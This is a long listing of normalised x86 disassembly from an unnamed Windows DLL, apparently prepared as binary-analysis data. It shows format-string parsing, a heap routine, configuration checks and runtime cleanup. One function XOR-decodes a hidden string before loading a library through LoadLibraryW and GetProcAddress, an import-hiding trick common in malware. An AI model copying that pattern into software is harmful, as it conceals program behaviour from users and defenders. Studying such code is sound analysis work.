mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_10022b5a
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_1007a4d0
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_10003288
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_1002a3ee
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_1007a4d0
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_1007a49d
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_10008102
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_1007c490
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_1007a49d
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_10079b60
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_1007a4d0
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_1007a49d
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_1002a3ee
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_100135b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebx + ebx + 0x2 ]
mov [ ebp - 0x4 ] ebx
cmp esi eax
jge r-xdata
jne r-xdata
mov eax [ edi + esi * 4 - 0x4 ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebx - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp - 0x4 ] ebx
jge r-xdata
mov ecx [ edi + eax * 4 - 0x4 ]
mov [ edi + ebx * 4 ] ecx
lea ebx [ eax - 0x1 ]
mov edx [ edi + esi * 4 ]
mov [ edi + ebx * 4 ] edx
mov ebx esi
lea esi [ esi + esi + 0x2 ]
cmp esi [ ebp + 0x8 ]
jl r-xdata
dec esi
mov edx [ ebp + 0xc ]
mov eax [ edx ]
pop esi
mov [ edi + ebx * 4 ] eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp esi eax
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
pop esi
mov [ edi + ebx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + esi * 4 ]
lea eax [ esi - 0x1 ]
mov [ edi + ebx * 4 ] edx
cdq
sub eax edx
mov ebx esi
sar eax 0x1
mov esi eax
cmp [ ebp - 0x4 ] ebx
jl r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
pop esi
mov [ edi + ebx * 4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_10013670
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
mov eax 0x6
call sub_1003bc70
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001372c
push 0x3c
mov eax sub_1007f914
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10059065
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100660be
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_100137fa
mov edi edi
push esi
push edi
mov esi ecx
call sub_1005d5d0
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0xc ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0xc ]
push edi
call sub_10055040
push edi
call sub_10022b5a
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_10013830
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10013880
push ebp
mov ebp esp
push 0xffffffff
push sub_100831eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
xor edx edx
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x84 ] dx
push ecx
mov ecx [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] edi
call sub_10003df0
test eax eax
je r-xdata
cmp [ ebp - 0x74 ] edi
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xd2
call sub_10013830
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
push esi
lea edi [ ebp - 0x84 ]
call sub_10066770
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0xcc
call sub_10013830
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x101
call sub_10013830
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
xor eax eax
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
mov eax 0x3
jmp r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_1006591f
add esp 0x4
sub_1001399b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
push 0x16
pop eax
pop ebp
retn
sub_100139d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10083519
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xa8 ] cl
push r--data
xor edi edi
mov ecx rw-data
call sub_10039b60
test eax eax
je r-xdata
mov eax 0x1
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_10039b60
test eax eax
je r-xdata
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_10039b60
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edi 0x8
cmp [ rw-data ] edi
jae r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x30 ]
call sub_10040ea0
add esp 0x4
mov edx esi
push r--data
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10017ea0
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10061060
mov eax 0x2
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x4c ]
call sub_10040ea0
add esp 0x4
mov eax esi
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10017ea0
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10061060
lea ecx [ ebp - 0x30 ]
call sub_10061060
mov eax 0x3
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x84 ]
call sub_10040ea0
add esp 0x4
mov ecx esi
push r--data
push ecx
mov [ ebp - 0x4 ] 0x2
call sub_10017ea0
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10061060
lea ecx [ ebp - 0x4c ]
call sub_10061060
lea ecx [ ebp - 0x30 ]
call sub_10061060
mov eax 0x4
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x68 ]
call sub_10040ea0
add esp 0x4
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0x54 ]
mov edi [ ebp - 0x68 ]
mov ebx 0x10
mov eax edi
cmp esi ebx
jae r-xdata
mov eax rw-data
push 0x0
push r--data
push eax
call sub_10050b90
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x68 ]
sete al
test al al
sete al
test al al
je r-xdata
cmp [ ebp - 0x58 ] eax
setne al
test eax eax
lea ecx [ ebp - 0x68 ]
call sub_10061060
lea ecx [ ebp - 0x84 ]
call sub_10061060
lea ecx [ ebp - 0x4c ]
call sub_10061060
lea ecx [ ebp - 0x30 ]
call sub_10061060
mov eax 0x5
jmp r-xdata
mov eax edi
cmp esi ebx
jae r-xdata
push eax
call [ StrToIntA@IAT ]
mov esi [ ebp - 0x84 ]
cmp [ ebp - 0x70 ] ebx
jae r-xdata
lea eax [ ebp - 0x68 ]
mov edx [ ebp - 0x4c ]
cmp [ ebp - 0x38 ] ebx
jae r-xdata
lea esi [ ebp - 0x84 ]
mov ecx [ ebp - 0x30 ]
cmp [ ebp - 0x1c ] ebx
jae r-xdata
lea edx [ ebp - 0x4c ]
push 0x0
push eax
push esi
push edx
push ecx
call sub_100116c0
add esp 0x14
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10001460
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10017ea0
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0xb8 ]
push ecx
lea ecx [ ebp - 0xa0 ]
call sub_10053890
add esp 0x8
mov esi eax
mov ebx [ ebp - 0xa4 ]
cmp ebx esi
je r-xdata
lea ecx [ ebp - 0xa0 ]
call sub_10061060
lea ecx [ ebp - 0x68 ]
call sub_10061060
lea ecx [ ebp - 0x84 ]
call sub_10061060
lea ecx [ ebp - 0x4c ]
call sub_10061060
lea ecx [ ebp - 0x30 ]
call sub_10061060
mov eax 0x6
jmp r-xdata
lea ebx [ ebp - 0xb8 ]
call sub_1006c7f0
lea ecx [ ebp - 0xa0 ]
call sub_10061060
lea ecx [ ebp - 0x68 ]
call sub_10061060
lea ecx [ ebp - 0x84 ]
call sub_10061060
lea ecx [ ebp - 0x4c ]
call sub_10061060
lea ecx [ ebp - 0x30 ]
call sub_10061060
xor eax eax
jmp r-xdata
call sub_1006c7f0
mov edx [ esi ]
mov [ ebx ] edx
mov eax [ esi + 0x4 ]
mov [ ebx + 0x4 ] eax
mov ecx [ esi + 0x8 ]
xor eax eax
mov [ ebx + 0x8 ] ecx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
sub_10013d50
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0xdb0 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0xdb0 ] edi
mov [ esi + 0xdb4 ] edi
mov [ esi + 0xdb8 ] edi
mov eax [ esi + 0xda0 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0xdb4 ]
lea edx [ esi + 0xdbc ]
push edx
push ecx
push eax
call sub_10015b10
mov edx [ esi + 0xdb0 ]
push edx
call sub_1006591f
add esp 0x14
mov [ esi + 0xda0 ] edi
mov [ esi + 0xda4 ] edi
mov [ esi + 0xda8 ] edi
pop edi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0xda4 ]
lea edx [ esi + 0xdac ]
push edx
push ecx
push eax
call sub_10015b10
mov edx [ esi + 0xda0 ]
push edx
call sub_1006591f
add esp 0x14
sub_10013de2
mov edi edi
push ebp
mov ebp esp
call sub_10039c8c
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_10013e09
push 0xe8
mov eax sub_100801dd
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x90 ] al
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0xb4 ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100599a6
pop ecx
mov esi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xb4 ]
lea eax [ ebp - 0xac ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10011620
mov esi eax
pop ecx
mov [ ebp - 0x88 ] esi
lea ecx [ ebp - 0xac ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub ebx [ ebp + 0x34 ]
push 0x30
inc ebx
push ebx
push 0x0
lea ecx [ ebp + 0x24 ]
call sub_1000bddb
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_10069ce0
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10051f6c
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
mov ebx eax
xor ebx edx
sub ebx edx
mov [ ebp - 0x8c ] ebx
cmp [ ebp + 0x34 ] ebx
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0xf
pop esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x2c ] 0x0
cmp [ ebp + 0x20 ] 0x0
mov edi [ ebp - 0x88 ]
mov eax [ edi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx edi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_1004ff82
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_100202c4
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_10028071
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000adb0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_10041a20
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000adb0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_10041a20
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x64 ] 0x0
mov eax [ ebp - 0x98 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
mov [ ebp - 0x84 ] al
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi ebx
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x98 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
jg r-xdata
mov esi [ ebp - 0x8c ]
cmp [ ebp + 0x34 ] esi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x94 ] 0x0
mov esi [ ebp - 0x88 ]
xor ebx ebx
inc ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax esi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x84 ]
sub esi eax
push 0x1
push esi
